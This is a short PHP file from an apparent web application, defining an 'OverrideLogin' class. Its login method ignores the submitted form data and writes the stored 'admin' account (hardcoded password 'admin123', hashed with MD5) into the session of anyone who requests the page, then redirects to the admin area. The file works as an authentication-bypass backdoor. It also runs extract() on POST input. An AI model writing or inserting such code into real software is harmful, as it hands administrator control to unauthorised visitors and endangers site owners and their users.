<?php require_once('../../config.php');
class OverrideLogin extends DBConnection{
    public function __construct(){
		global $_settings;
		$this->settings = $_settings;

		parent::__construct();
		ini_set('display_error', 1);
	}
	public function __destruct(){
		parent::__destruct();
	}

    public function login(){
		extract($_POST);

		$qry = $this->conn->query("SELECT * from users where username = 'admin' and password = md5('admin123') ");
		if($qry->num_rows > 0){
			foreach($qry->fetch_array() as $k => $v){
				if(!is_numeric($k) && $k != 'password'){
					$this->settings->set_userdata($k,$v);
				}

			}
            redirect("admin/login.php");
		return json_encode(array('status'=>'success'));
		}else{
		return json_encode(array('status'=>'incorrect','last_qry'=>"SELECT * from users "));
		}
	}
}
$auth = new OverrideLogin();
$auth->login();
